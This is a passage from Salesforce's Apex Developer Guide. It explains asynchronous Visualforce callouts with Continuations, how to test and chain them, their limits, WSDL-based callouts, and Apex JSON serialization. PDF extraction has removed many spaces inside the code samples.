// Uniquelabelcorrespondingto the continuation
publicStringrequestLabel;
// Resultof callout
publicStringresult{get;set;}
// Calloutendpointas a namedcredentialURL
// or, as shownhere,as the long-runningserviceURL
privatestaticfinalStringLONG_RUNNING_SERVICE_URL=
'<InsertyourserviceURL>';
// Actionmethod
publicObjectstartRequest(){
// Createcontinuationwitha timeout
Continuationcon = new Continuation(40);
// Set callbackmethod
con.continuationMethod='processResponse';
// Createcalloutrequest
HttpRequestreq = new HttpRequest();
req.setMethod('GET');
req.setEndpoint(LONG_RUNNING_SERVICE_URL);
// Add calloutrequestto continuation
this.requestLabel= con.addHttpRequest(req);
// Returnthe continuation
returncon;
}
// Callbackmethod
publicObjectprocessResponse(){
// Get the responseby usingthe uniquelabel
HttpResponseresponse= Continuation.getResponse(this.requestLabel);
// Set the resultvariablethatis displayedon the Visualforcepage
this.result= response.getBody();
// Returnnullto re-renderthe originalVisualforcepage
returnnull;
}
}
630
Integration and Apex UtilitiesApex Developer Guide

Note:
•
You can make up to three asynchronous callouts in a single continuation. Add these callout requests to the same continuation
by using the addHttpRequest method of the Continuation class. The callouts run in parallel for this continuation
and suspend the Visualforce request. Only after the external service returns all callouts, the Visualforce process resumes.
•
Asynchronous callouts are supported only through a Visualforce page. Making an asynchronous callout by invoking the action
method outside a Visualforce page, such as in the Developer Console, isn’t supported.
•
Asynchronous callouts are available for Apex controllers and Visualforce pages saved in version 30.0 and later. If JavaScript
remoting is used, version 31.0 or later is required.
•
Asynchronous callouts, including callouts that specify named credentials as the callout endpoint, aren’t supported over Private
Connect.
Process for Using Asynchronous Callouts
To use asynchronous callouts, create a Continuation object in an action method of a controller, and implement a callback
method.
Testing Asynchronous Callouts
Write tests to test your controller and meet code coverage requirements for deploying or packaging Apex. Because Apex tests don’t
support making callouts, you can simulate callout requests and responses. When you’re simulating a callout, the request doesn’t
get sent to the external service, and a mock response is used.
Asynchronous Callout Limits
When a continuation is executing, the continuation-specific limits apply. When the continuation returns and the request resumes,
a new Apex transaction starts. All Apex and Visualforce limits apply and are reset in the new transaction, including the Apex callout
limits.
Making Multiple Asynchronous Callouts
To make multiple callouts to a long-running service simultaneously from a Visualforce page, you can add up to three requests to
the Continuation instance. An example of when to make simultaneous callouts is when you’re making independent requests to a
service, such as getting inventory statistics for two products.
Chaining Asynchronous Callouts
If the order of the callouts matters, or when a callout is conditional on the response of another callout, you can chain callout requests.
Chaining callouts means that the next callout is made only after the response of the previous callout returns. For example, you might
need to chain a callout to get warranty extension information after the warranty service response indicates that the warranty expired.
You can chain up to three callouts.
Making an Asynchronous Callout from an Imported WSDL
In addition to HttpRequest-based callouts, asynchronous callouts are supported in Web service calls that are made from
WSDL-generated classes. The process of making asynchronous callouts from a WSDL-generated class is similar to the process for
using the HttpRequest class.
SEE ALSO:
Named Credentials as Callout Endpoints
Lightning Web Components Developer Guide: Make Long-Running Callouts with Continuations
Process for Using Asynchronous Callouts
To use asynchronous callouts, create a Continuation object in an action method of a controller, and implement a callback method.
631
Integration and Apex UtilitiesApex Developer Guide

Invoking an Asynchronous Callout in an Action Method
To invoke an asynchronous callout, call the external service by using a Continuation instance in your Visualforce action method.
When you create a continuation, you can specify a timeout value and the name of the callback method. For example, the following
creates a continuation with a 60-second timeout and a callback method name of processResponse.
Continuationcont= new Continuation(60);
cont.continuationMethod= 'processResponse';
Next, associate the Continuation object to an external callout. To do so, create the HTTP request, and then add this request to the
continuation as follows:
StringrequestLabel= cont.addHttpRequest(request);
Note:  This process is based on making callouts with the HttpRequest class. For an example that uses a WSDL-based class, see
Making an Asynchronous Callout from an Imported WSDL.
The method that invokes the callout (the action method) must return the Continuation object to instruct Visualforce to suspend
the current request after the system sends the callout and waits for the callout response. The Continuation object holds the details
of the callout to be executed.
This is the signature of the method that invokes the callout. The Object return type represents a Continuation.
publicObjectcalloutActionMethodName()
Defining a Callback Method
The response is returned after the external service finishes processing the callout. You can specify a callback method for asynchronous
execution after the callout returns. This callback method must be defined in the controller class where the callout invocation method is
defined. You can define a callback method to process the returned response, such as retrieving the response for display on a Visualforce
page.
The callback method doesn’t take any arguments and has this signature.
publicObjectcallbackMethodName()
The Object return type represents a Continuation, a PageReference, or null. To render the original Visualforce page and
finish the Visualforce request, return null in the callback method.
If the action method uses JavaScript remoting (is annotated with @RemoteAction), the callback method must be static and has the
following supported signatures.
publicstaticObjectcallbackMethodName(List<String>labels, Objectstate)
Or:
publicstaticObjectcallbackMethodName(Objectstate)
The labels parameter is supplied by the system when it invokes the callback method and holds the labels associated with the callout
requests made. The state parameter is supplied by setting the Continuation.state property in the controller.
This table lists the return values for the callback method. Each return value corresponds to a different behavior.
Table 10: Possible Return Values for the Callback Method
Request Lifecycle and OutcomeCallback Method Return Value
The system finishes the Visualforce page request and renders the
original Visualforce page (or a portion of it).
null
632
Integration and Apex UtilitiesApex Developer Guide

Request Lifecycle and OutcomeCallback Method Return Value
The system finishes the Visualforce page request and redirects to
a new Visualforce page.
(Use query parameters in the PageReference to pass the
results of the Continuation to the new page.)
PageReference
The system suspends the Visualforce request again and waits for
the response of a new callout. Return a new Continuation
in the callback method to chain asynchronous callouts.
Continuation
Note:  If the continuationMethod property isn’t set for a continuation, the same action method that made the callout is
called again when the callout response returns.
SEE ALSO:
Apex Reference Guide: Continuation Class
Testing Asynchronous Callouts
Write tests to test your controller and meet code coverage requirements for deploying or packaging Apex. Because Apex tests don’t
support making callouts, you can simulate callout requests and responses. When you’re simulating a callout, the request doesn’t get
sent to the external service, and a mock response is used.
The following example shows how to invoke a mock asynchronous callout in a test for a Web service call that uses HTTPRequest.
To simulate callouts in continuations, call these methods of the Test class: Test.setContinuationResponse() and
Test.invokeContinuationMethod().
The controller class to test is listed first, followed by the test class. The controller class from Make Long-Running Callouts with Continuations
is reused here.
publicwithsharingclassContinuationController{
// Uniquelabelcorrespondingto the continuationrequest
publicStringrequestLabel;
// Resultof callout
publicStringresult{get;set;}
// Endpointof long-runningservice
privatestaticfinalStringLONG_RUNNING_SERVICE_URL=
'<InsertyourserviceURL>';
// Actionmethod
publicObjectstartRequest(){
// Createcontinuationwitha timeout
Continuationcon = new Continuation(40);
// Set callbackmethod
con.continuationMethod='processResponse';
// Createcalloutrequest
HttpRequestreq = new HttpRequest();
req.setMethod('GET');
req.setEndpoint(LONG_RUNNING_SERVICE_URL);
633
Integration and Apex UtilitiesApex Developer Guide

// Add calloutrequestto continuation
this.requestLabel= con.addHttpRequest(req);
// Returnthe continuation
returncon;
}
// Callbackmethod
publicObjectprocessResponse(){
// Get the responseby usingthe uniquelabel
HttpResponseresponse= Continuation.getResponse(this.requestLabel);
// Set the resultvariablethatis displayedon the Visualforcepage
this.result= response.getBody();
// Returnnullto re-renderthe originalVisualforcepage
returnnull;
}
}
This example shows the test class corresponding to the controller. This test class contains a test method for testing an asynchronous
callout. In the test method, Test.setContinuationResponse sets a mock response, and
Test.invokeContinuationMethod causes the callback method for the continuation to be executed. The test ensures that
the callback method processed the mock response by verifying that the controller’s result variable is set to the expected response.
@isTest
publicclassContinuationTestingForHttpRequest{
publicstatictestmethodvoidtestWebService(){
ContinuationControllercontroller= new ContinuationController();
// Invokethe continuationby callingthe actionmethod
Continuationconti= (Continuation)controller.startRequest();
// Verifythatthe continuationhas the properrequests
Map<String, HttpRequest>requests= conti.getRequests();
system.assert(requests.size()== 1);
system.assert(requests.get(controller.requestLabel)!= null);
// Performmockcallout
// (i.e.skipthe calloutand callthe callbackmethod)
HttpResponseresponse= new HttpResponse();
response.setBody('Mockresponsebody');
// Set the fakeresponsefor the continuation
Test.setContinuationResponse(controller.requestLabel,response);
// Invokecallbackmethod
Objectresult= Test.invokeContinuationMethod(controller,conti);
// resultis the returnvalueof the callback
System.assertEquals(null, result);
// Verifythatthe controller'sresultvariable
//is set to the mockresponse.
System.assertEquals('Mockresponsebody', controller.result);
}
}
634
Integration and Apex UtilitiesApex Developer Guide

Asynchronous Callout Limits
When a continuation is executing, the continuation-specific limits apply. When the continuation returns and the request resumes, a
new Apex transaction starts. All Apex and Visualforce limits apply and are reset in the new transaction, including the Apex callout limits.
Continuation-Specific Limits
The following are Apex and Visualforce limits that are specific to a continuation.
LimitDescription
3Maximum number of parallel Apex callouts in a single continuation
3Maximum number of chained Apex callouts
120 secondsMaximum timeout for a single continuation
1
80 KBMaximum Visualforce controller-state size
2
1 MBMaximum HTTP response size
1 MBMaximum HTTP POST form size—the size of all keys and values in the form
3
500Maximum number of keys in the HTTP POST form
3
1
 The timeout that is specified in the autogenerated Web service stub and in the HttpRequest objects is ignored. Only this timeout limit
is enforced for a continuation.
2
 When the continuation is executed, the Visualforce controller is serialized. When the continuation is completed, the controller is
deserialized and the callback is invoked. Use the Apex transient modifier to designate a variable that is not to be serialized. The
framework uses only serialized members when it resumes. The controller-state size limit is separate from the view state limit. See
Differences Between Continuation Controller State and Visualforce View State.
3
 This limit is for HTTP POST forms with the following content type headers:
content-type='application/x-www-form-urlencoded' and content-type='multipart/form-data'
Differences Between Continuation Controller State and Visualforce View State
Controller state and view state are distinct. Controller state for a continuation consists of the serialization of all controllers that are involved
in the request, not only the controller that invokes the continuation. The serialized controllers include controller extensions, and custom
and internal component controllers. The controller state size is logged in the debug log as a USER_DEBUG event.
View state holds more data than the controller state and has a higher maximum size (170KB). The view state contains state and component
structure. State is serialization of all controllers and all the attributes of each component on a page, including subpages and subcomponents
. Component structure is the parent-child relationship of components that are in the page. You can monitor the view state size in the
Developer Console or in the footer of a Visualforce page when development mode is enabled. For more information, see “View State
Tab” in the Salesforce Help or refer to the Visualforce Developer’s Guide.
Making Multiple Asynchronous Callouts
To make multiple callouts to a long-running service simultaneously from a Visualforce page, you can add up to three requests to the
Continuation instance. An example of when to make simultaneous callouts is when you’re making independent requests to a service,
such as getting inventory statistics for two products.
635
Integration and Apex UtilitiesApex Developer Guide

When you’re making multiple callouts in the same continuation, the callout requests run in parallel and suspend the Visualforce request.
Only after all callout responses are returned does the Visualforce process resume.
The following Visualforce and Apex examples show how to make two asynchronous callouts simultaneously by using a single continuation.
The Visualforce page is shown first. The Visualforce page contains a button that invokes the action method
startRequestsInParallel in the controller. When the Visualforce process resumes, the outputPanel component is
rendered again. This panel displays the responses of the two asynchronous callouts.
<apex:pagecontroller="MultipleCalloutController"showChat="false"showHeader="false">
<apex:form>
<!--Invokesthe actionmethodwhenthe userclicksthisbutton.-->
<apex:commandButtonaction="{!startRequestsInParallel}"value="StartRequest"
reRender="panel"/>
</apex:form>
<apex:outputPanelid="panel">
<!--Displaysthe responsebodyof the initialcallout.-->
<apex:outputTextvalue="{!result1}"/>
<br/>
<!--Displaysthe responsebodyof the chainedcallout.-->
<apex:outputTextvalue="{!result2}"/>
</apex:outputPanel>
</apex:page>
This example shows the controller class for the Visualforce page. The startRequestsInParallel method adds two requests
to the Continuation. After all callout responses are returned, the callback method (processAllResponses) is invoked and processes
the responses.
publicwithsharingclassMultipleCalloutController{
// Uniquelabelfor the firstrequest
publicStringrequestLabel1;
// Uniquelabelfor the secondrequest
publicStringrequestLabel2;
// Resultof firstcallout
publicStringresult1{get;set;}
// Resultof secondcallout
publicStringresult2{get;set;}
// Endpointsof long-runningservice
privatestaticfinalStringLONG_RUNNING_SERVICE_URL1=
'<InsertyourfirstserviceURL>';
privatestaticfinalStringLONG_RUNNING_SERVICE_URL2=
'<InsertyoursecondserviceURL>';
// Actionmethod
publicObjectstartRequestsInParallel(){
// Createcontinuationwitha timeout
Continuationcon = new Continuation(60);
// Set callbackmethod
con.continuationMethod='processAllResponses';
// Createfirstcalloutrequest
HttpRequestreq1= new HttpRequest();
636
Integration and Apex UtilitiesApex Developer Guide

req1.setMethod('GET');
req1.setEndpoint(LONG_RUNNING_SERVICE_URL1);
// Add firstcalloutrequestto continuation
this.requestLabel1= con.addHttpRequest(req1);
// Createsecondcalloutrequest
HttpRequestreq2= new HttpRequest();
req2.setMethod('GET');
req2.setEndpoint(LONG_RUNNING_SERVICE_URL2);
// Add secondcalloutrequestto continuation
this.requestLabel2= con.addHttpRequest(req2);
// Returnthe continuation
returncon;
}
// Callbackmethod.
// Invokedonlywhenresponsesof all calloutsare returned.
publicObjectprocessAllResponses(){
// Get the responseof the firstrequest
HttpResponseresponse1= Continuation.getResponse(this.requestLabel1);
this.result1= response1.getBody();
// Get the responseof the secondrequest
HttpResponseresponse2= Continuation.getResponse(this.requestLabel2);
this.result2= response2.getBody();
// Returnnullto re-renderthe originalVisualforcepage
returnnull;
}
}
Chaining Asynchronous Callouts
If the order of the callouts matters, or when a callout is conditional on the response of another callout, you can chain callout requests.
Chaining callouts means that the next callout is made only after the response of the previous callout returns. For example, you might
need to chain a callout to get warranty extension information after the warranty service response indicates that the warranty expired.
You can chain up to three callouts.
The following Visualforce and Apex examples show how to chain one callout to another. The Visualforce page is shown first. The Visualforce
page contains a button that invokes the action method invokeInitialRequest in the controller. The Visualforce process is
suspended each time a continuation is returned. The Visualforce process resumes after each response is returned and renders each
response in the outputPanel component.
<apex:pagecontroller="ChainedContinuationController"showChat="false"showHeader="false">
<apex:form>
<!--Invokesthe actionmethodwhenthe userclicksthisbutton.-->
<apex:commandButtonaction="{!invokeInitialRequest}"value="StartRequest"
reRender="panel"/>
</apex:form>
637
Integration and Apex UtilitiesApex Developer Guide

<apex:outputPanelid="panel">
<!--Displaysthe responsebodyof the initialcallout. -->
<apex:outputTextvalue="{!result1}"/>
<br/>
<!--Displaysthe responsebodyof the chainedcallout. -->
<apex:outputTextvalue="{!result2}"/>
</apex:outputPanel>
</apex:page>
This example show the controller class for the Visualforce page. The invokeInitialRequest method creates the first continuation.
The callback method (processInitialResponse) processes the response of the first callout. If this response meets a certain
condition, the method chains another callout by returning a second continuation. After the response of the chained continuation is
returned, the second callback method (processChainedResponse) is invoked and processes the second response.
publicwithsharingclassChainedContinuationController{
// Uniquelabelfor the initialcalloutrequest
publicStringrequestLabel1;
// Uniquelabelfor the chainedcalloutrequest
publicStringrequestLabel2;
// Resultof initialcallout
publicStringresult1{get;set;}
// Resultof chainedcallout
publicStringresult2{get;set;}
// Endpointof long-runningservice
privatestaticfinalStringLONG_RUNNING_SERVICE_URL1=
'<InsertyourfirstserviceURL>';
privatestaticfinalStringLONG_RUNNING_SERVICE_URL2=
'<InsertyoursecondserviceURL>';
// Actionmethod
publicObjectinvokeInitialRequest(){
// Createcontinuationwitha timeout
Continuationcon = new Continuation(60);
// Set callbackmethod
con.continuationMethod='processInitialResponse';
// Createfirstcalloutrequest
HttpRequestreq = new HttpRequest();
req.setMethod('GET');
req.setEndpoint(LONG_RUNNING_SERVICE_URL1);
// Add initialcalloutrequestto continuation
this.requestLabel1= con.addHttpRequest(req);
// Returnthe continuation
returncon;
}
// Callbackmethodfor initialrequest
publicObjectprocessInitialResponse(){
// Get the responseby usingthe uniquelabel
638
Integration and Apex UtilitiesApex Developer Guide

HttpResponseresponse= Continuation.getResponse(this.requestLabel1);
// Set the resultvariablethatis displayedon the Visualforcepage
this.result1= response.getBody();
ContinuationchainedContinuation= null;
// Chaincontinuationif someconditionis met
if (response.getBody().toLowerCase().contains('expired')) {
// Createa secondcontinuation
chainedContinuation= new Continuation(60);
// Set callbackmethod
chainedContinuation.continuationMethod='processChainedResponse';
// Createcalloutrequest
HttpRequestreq = new HttpRequest();
req.setMethod('GET');
req.setEndpoint(LONG_RUNNING_SERVICE_URL2);
// Add calloutrequestto continuation
this.requestLabel2= chainedContinuation.addHttpRequest(req);
}
// Startanothercontinuation
returnchainedContinuation;
}
// Callbackmethodfor chainedrequest
publicObjectprocessChainedResponse(){
// Get the responsefor the chainedrequest
HttpResponseresponse= Continuation.getResponse(this.requestLabel2);
// Set the resultvariablethatis displayedon the Visualforcepage
this.result2= response.getBody();
// Returnnullto re-renderthe originalVisualforcepage
returnnull;
}
}
Note:  The response of a continuation must be retrieved before you create a new continuation and before the Visualforce request
is suspended again. You can’t retrieve an old response from an earlier continuation in the chain of continuations.
Making an Asynchronous Callout from an Imported WSDL
In addition to HttpRequest-based callouts, asynchronous callouts are supported in Web service calls that are made from
WSDL-generated classes. The process of making asynchronous callouts from a WSDL-generated class is similar to the process for using
the HttpRequest class.
When you import a WSDL in Salesforce, Salesforce autogenerates two Apex classes for each namespace in the imported WSDL. One
class is the service class for the synchronous service, and the other is a modified version for the asynchronous service. The autogenerated
asynchronous class name starts with the Async prefix and has the format AsyncServiceName. ServiceName is the name of
the original unmodified service class. The asynchronous class differs from the standard class in the following ways.
•
The public service methods contain an extra Continuation parameter as the first parameter.
•
The Web service operations are invoked asynchronously and their responses are obtained with the getValue method of the
response element.
639
Integration and Apex UtilitiesApex Developer Guide

•
The WebServiceCallout.beginInvoke and WebServiceCallout.endInvoke are used to invoke the service
and get the response respectively.
You can generate Apex classes from a WSDL in the Salesforce user interface. From Setup, enter Apex Classes in the QuickFind
box, then select Apex Classes.
To make asynchronous Web service callouts, call the methods on the autogenerated asynchronous class by passing your Continuation
instance to these methods. The following example is based on a hypothetical stock-quote service. This example assumes that the
organization has a class, called AsyncSOAPStockQuoteService, that was autogenerated via a WSDL import. The example shows
how to make an asynchronous callout to the service by using the autogenerated AsyncSOAPStockQuoteService class. First,
this example creates a continuation with a 60-second timeout and sets the callback method. Next, the code example invokes the
beginStockQuote method by passing it the Continuation instance. The beginStockQuote method call corresponds to an
asynchronous callout execution.
publicContinuationstartRequest(){
IntegerTIMEOUT_INT_SECS= 60;
Continuationcont= new Continuation(TIMEOUT_INT_SECS);
cont.continuationMethod= 'processResponse';
AsyncSOAPStockQuoteService.AsyncStockQuoteServiceSoap
stockQuoteService=
new AsyncSOAPStockQuoteService.AsyncStockQuoteServiceSoap();
stockQuoteFuture= stockQuoteService.beginStockQuote(cont,'CRM');
returncont;
}
When the external service returns the response of the asynchronous callout (the beginStockQuote method), this callback method
is executed. It gets the response by calling the getValue method on the response object.
publicObjectprocessResponse(){
result= stockQuoteFuture.getValue();
returnnull;
}
The following is the entire controller with the action and callback methods.
publicclassContinuationSOAPController{
AsyncSOAPStockQuoteService.GetStockQuoteResponse_elementFuture
stockQuoteFuture;
publicStringresult{get;set;}
// Actionmethod
publicContinuationstartRequest(){
IntegerTIMEOUT_INT_SECS= 60;
Continuationcont= new Continuation(TIMEOUT_INT_SECS);
cont.continuationMethod= 'processResponse';
AsyncSOAPStockQuoteService.AsyncStockQuoteServiceSoap
stockQuoteService=
new AsyncSOAPStockQuoteService.AsyncStockQuoteServiceSoap();
stockQuoteFuture= stockQuoteService.beginGetStockQuote(cont,'CRM');
returncont;
}
640
Integration and Apex UtilitiesApex Developer Guide

// Callbackmethod
publicObjectprocessResponse(){
result= stockQuoteFuture.getValue();
// Returnnullto re-renderthe originalVisualforcepage
returnnull;
}
}
This example shows the corresponding Visualforce page that invokes the startRequest method and displays the result field.
<apex:pagecontroller="ContinuationSOAPController"showChat="false"showHeader="false">
<apex:form>
<!--Invokesthe actionmethodwhenthe userclicksthisbutton.-->
<apex:commandButtonaction="{!startRequest}"
value="StartRequest"reRender="result"/>
</apex:form>
<!--Thisoutputtextcomponentdisplaysthe calloutresponsebody.-->
<apex:outputTextvalue="{!result}"/>
</apex:page>
Testing WSDL-Based Asynchronous Callouts
Testing asynchronous callouts that are based on Apex classes from a WSDL is similar to the process that’s used with callouts that are
based on the HttpRequest class. Before you test ContinuationSOAPController.cls, create a class that implements
WebServiceMock. This class enables safe testing for ContinuationTestForWSDL.cls, which we'll create in a moment,
by enabling a mock continuation and making sure that the test has no real effect.
publicclassAsyncSOAPStockQuoteServiceMockImplimplementsWebServiceMock{
publicvoiddoInvoke(
Objectstub,
Objectrequest,
Map<String, Object> response,
Stringendpoint,
StringsoapAction,
StringrequestName,
StringresponseNS,
StringresponseName,
StringresponseType){
// do nothing
}
}
This example is the test class that corresponds to the ContinuationSOAPController controller. The test method in the class
sets a fake response and invokes a mock continuation. The callout isn’t sent to the external service. To perform a mock callout, the test
calls these methods of the Test class: Test.setContinuationResponse() and Test.invokeContinuationMethod().
@isTest
publicclassContinuationTestingForWSDL{
publicstatictestmethodvoidtestWebService(){
ContinuationSOAPControllerdemoWSDLClass=
new ContinuationSOAPController();
// Invokethe continuationby callingthe actionmethod
641
Integration and Apex UtilitiesApex Developer Guide

Continuationconti= demoWSDLClass.startRequest();
// Verifythatthe continuationhas the properrequests
Map<String, HttpRequest>requests= conti.getRequests();
System.assertEquals(requests.size(),1);
// Performmockcallout
// (i.e.skipthe calloutand callthe callbackmethod)
HttpResponseresponse= new HttpResponse();
response.setBody('<SOAP:Envelope'
+ ' xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/">'
+ '<SOAP:Body>'
+ '<m:getStockQuoteResponse'
+ 'xmlns:m="http://soap.sforce.com/schemas/class/StockQuoteServiceSoap">'
+ '<m:result>Mockresponsebody</m:result>'
+ '</m:getStockQuoteResponse>'
+ '</SOAP:Body>'
+ '</SOAP:Envelope>');
// Set the fakeresponsefor the continuation
StringrequestLabel= requests.keyset().iterator().next();
Test.setContinuationResponse(requestLabel,response);
// Invokecallbackmethod
Objectresult= Test.invokeContinuationMethod(demoWSDLClass,conti);
System.debug(demoWSDLClass);
// resultis the returnvalueof the callback
System.assertEquals(null, result);
// Verifythatthe controller'sresultvariable
//is set to the mockresponse.
System.assertEquals('Mockresponsebody', demoWSDLClass.result);
}
}
JSON Support
JavaScript Object Notation (JSON) support in Apex enables the serialization of Apex objects into JSON format and the deserialization of
serialized JSON content.
Apex provides a set of classes that expose methods for JSON serialization and deserialization. The following table describes the classes
available.
DescriptionClass
Contains methods for serializing Apex objects into JSON format
and deserializing JSON content that was serialized using the
serialize method in this class.
System.JSON
Contains methods used to serialize objects into JSON content using
the standard JSON encoding.
System.JSONGenerator
Represents a parser for JSON-encoded content.System.JSONParser
642
Integration and Apex UtilitiesApex Developer Guide

The System.JSONToken enumeration contains the tokens used for JSON parsing.
Methods in these classes throw a JSONException if an issue is encountered during execution.
JSON Support Considerations
•
JSON serialization and deserialization support is available for sObjects (standard objects and custom objects), Apex primitive
and collection types, return types of Database methods (such as SaveResult and DeleteResult), and instances of your Apex classes.
•
Only custom objects, which are sObject types of managed packages can be serialized from code that is external to the
managed package. Objects that are instances of Apex classes defined in the managed package can't be serialized.
•
A Map object is serializable into JSON only if it uses one of the following data types as a key.
–
Boolean
–
Date
–
DateTime
–
Decimal
–
Double
–
Enum
–
Id
–
Integer
–
Long
–
String
–
Time
•
When an object is declared as the parent type but is set to an instance of the subtype, some data can be lost. The object gets
serialized and deserialized as the parent type and any fields that are specific to the subtype are lost.
•
An object that has a reference to itself won’t get serialized and causes a JSONException to be thrown.
•
Reference graphs that reference the same object twice are deserialized and cause multiple copies of the referenced object to
be generated.
•
The System.JSONParser data type isn’t serializable. If you try to create an instance of a serializable class, such as a Visualforce
controller, that has a member variable of type System.JSONParser, you receive an exception. To use JSONParser in
a serializable class, use a local variable instead in your method.
Versioned Behavior Changes
In API version 63.0 and later, JSON serialization of custom exceptions and most built-in exceptions isn't supported. Attempting to serialize
an exception throws an error: Typeunsupportedin JSON:MyException.
In API version 53.0 and later, DateTime format and processing has been updated. The API correctly handles DateTime values in JSON
requests that use more than 3 digits after the decimal point. Requests that use an unsupported DateTime format (such as 123456000)
result in an error. Salesforce recommends that you strictly adhere to DateTime formats specified in Valid Date and DateTime Formats.
Roundtrip Serialization and Deserialization
Use the JSON class methods to perform roundtrip serialization and deserialization of your JSON content. These methods enable
you to serialize objects into JSON-formatted strings and to deserialize JSON strings back into objects.
JSON Generator
Using the JSONGenerator class methods, you can generate standard JSON-encoded content.
643
Integration and Apex UtilitiesApex Developer Guide

JSON Parsing
Use the JSONParser class methods to parse JSON-encoded content. These methods enable you to parse a JSON-formatted
response that's returned from a call to an external service, such as a web service callout.
Roundtrip Serialization and Deserialization
Use the JSON class methods to perform roundtrip serialization and deserialization of your JSON content. These methods enable you
to serialize objects into JSON-formatted strings and to deserialize JSON strings back into objects.
Example: Serialize and Deserialize a List of Invoices
This example creates a list of InvoiceStatement objects and serializes the list. Next, the serialized JSON string is used to deserialize
the list again and the sample verifies that the new list contains the same invoices that were present in the original list.
publicclassJSONRoundTripSample{
publicclassInvoiceStatement{
LonginvoiceNumber;
DatetimestatementDate;
DecimaltotalPrice;
publicInvoiceStatement(Longi, Datetimedt, Decimalprice)
{
invoiceNumber= i;
statementDate= dt;
totalPrice= price;
}
}
publicstaticvoidSerializeRoundtrip(){
Datetimedt = Datetime.now();
// Createa few invoices.
InvoiceStatementinv1= new InvoiceStatement(1,Datetime.valueOf(dt),1000);
InvoiceStatementinv2= new InvoiceStatement(2,Datetime.valueOf(dt),500);
// Add the invoicesto a list.
List<InvoiceStatement>invoices= new List<InvoiceStatement>();
invoices.add(inv1);
invoices.add(inv2);
// Serializethe listof InvoiceStatementobjects.
StringJSONString= JSON.serialize(invoices);
System.debug('Serializedlistof invoicesintoJSONformat:' + JSONString);
// Deserializethe listof invoicesfromthe JSONstring.
List<InvoiceStatement>deserializedInvoices=
(List<InvoiceStatement>)JSON.deserialize(JSONString,List<InvoiceStatement>.class);
System.assertEquals(invoices.size(),deserializedInvoices.size());
Integeri=0;
for (InvoiceStatementdeserializedInvoice:deserializedInvoices){
system.debug('Deserialized:'+ deserializedInvoice.invoiceNumber+ ','
+ deserializedInvoice.statementDate.formatGmt('MM/dd/yyyyHH:mm:ss.SSS')
+ ', ' + deserializedInvoice.totalPrice);
644
Integration and Apex UtilitiesApex Developer Guide

system.debug('Original:'+ invoices[i].invoiceNumber+ ','
+ invoices[i].statementDate.formatGmt('MM/dd/yyyyHH:mm:ss.SSS')
+ ', ' + invoices[i].totalPrice);
i++;
}
}
}
JSON Serialization Considerations
The behavior of the serialize method differs depending on the Salesforce API version of the Apex code saved.
Serialization of queried sObject with additional fields set
For Apex saved using Salesforce API version 27.0 and earlier, if queried sObjects have additional fields set, these fields aren’t included
in the serialized JSON string returned by the serialize method. Starting with Apex saved using Salesforce API version 28.0, the
additional fields are included in the serialized JSON string.
This example adds a field to a contact after it has been queried, and then serializes the contact. The assertion statement verifies that
the JSON string contains the additional field. The assertion passes for Apex saved using Salesforce API version 28.0 and later.
Contactcon = [SELECTId, LastName,AccountIdFROMContactLIMIT1];
// Set additionalfield
con.FirstName= 'Joe';
Stringjsonstring= Json.serialize(con);
System.debug(jsonstring);
System.assert(jsonstring.contains('Joe') == true);
Serialization of aggregate query result fields
For Apex saved using Salesforce API version 27.0, results of aggregate queries don’t include the fields in the SELECT statement when
serialized using the serialize method. For earlier API versions or for API version 28.0 and later, serialized aggregate query results
include all fields in the SELECT statement.
This aggregate query returns two fields: the count of ID fields and the account name.
StringjsonString= JSON.serialize(
Database.query('SELECTCount(Id),Account.NameFROMContactWHEREAccount.Name!=
nullGROUPBY Account.NameLIMIT1'));
System.debug(jsonString);
// Expectedoutputin API v 26 and earlieror v28 and later
// [{"attributes":{"type":"AggregateResult"},"expr0":2,"Name":"acct1"}]
Serialization of empty fields
Starting with API version 28.0, null fields aren’t serialized and aren’t included in the JSON string, unlike in earlier versions. This change
doesn’t affect deserializing JSON strings with JSON methods, such as Json.deserialize(). This change is noticeable when you inspect
the JSON string. For example:
StringjsonString= JSON.serialize(
[SELECTId, Name,WebsiteFROMAccountWHEREWebsite= nullLIMIT1]);
System.debug(jsonString);
// In v27.0and earlier,the stringincludesthe nullfieldand lookslikethe following.
// {"attributes":{...},"Id":"001D000000Jsm0WIAR","Name":"Acme","Website":null}
// In v28.0and later,the stringdoesn’tincludethe nullfieldand lookslike
645
Integration and Apex UtilitiesApex Developer Guide

//  the following.
// {"attributes":{...},"Name":"Acme","Id":"001D000000Jsm0WIAR"}}
Serialization of IDs
In API version 34.0 and earlier, ID comparison using == fails for IDs that have been through roundtrip JSON serialization and
deserialization.
JSON Deserialization Considerations
JSON from aggregate results can’t be deserialized back into Apex AggregateResult objects because they have no named fields.
SEE ALSO:
Apex Reference Guide: JSON Class
JSON Generator
Using the JSONGenerator class methods, you can generate standard JSON-encoded content.
You can construct JSON content, element by element, using the standard JSON encoding. To do so, use the methods in the
JSONGenerator class.
JSONGenerator Sample
This example generates a JSON string in pretty print format by using the methods of the JSONGenerator class. The example first
adds a number field and a string field, and then adds a field to contain an object field of a list of integers, which gets deserialized properly.
Next, it adds the A object into the ObjectA field, which also gets deserialized.
publicclassJSONGeneratorSample{
publicclassA {
Stringstr;
publicA(Strings) { str = s; }
}
staticvoidgenerateJSONContent(){
// Createa JSONGeneratorobject.
// Passtrueto the constructorfor prettyprintformatting.
JSONGeneratorgen = JSON.createGenerator(true);
// Createa listof integersto writeto the JSONstring.
List<integer>intlist= new List<integer>();
intlist.add(1);
intlist.add(2);
intlist.add(3);
// Createan objectto writeto the JSONstring.
A x = new A('X');
// Writedatato the JSONstring.
gen.writeStartObject();
gen.writeNumberField('abc', 1.21);
gen.writeStringField('def', 'xyz');
646
Integration and Apex UtilitiesApex Developer Guide

gen.writeFieldName('ghi');
gen.writeStartObject();
gen.writeObjectField('aaa', intlist);
gen.writeEndObject();
gen.writeFieldName('ObjectA');
gen.writeObject(x);
gen.writeEndObject();
// Get the JSONstring.
Stringpretty= gen.getAsString();
System.assertEquals('{\n'+
'  "abc": 1.21,\n'+
'  "def": "xyz",\n'+
'  "ghi": {\n'+
'"aaa": [ 1, 2, 3 ]\n'+
'  },\n'+
'  "ObjectA" : {\n'+
'"str": "X"\n'+
'  }\n'+
'}', pretty);
}
}
SEE ALSO:
Apex Reference Guide: JSONGenerator Class
JSON Parsing
Use the JSONParser class methods to parse JSON-encoded content. These methods enable you to parse a JSON-formatted response
that's returned from a call to an external service, such as a web service callout.
The following are samples that show how to parse JSON strings.
Example: Parsing a JSON Response from a Web Service Callout
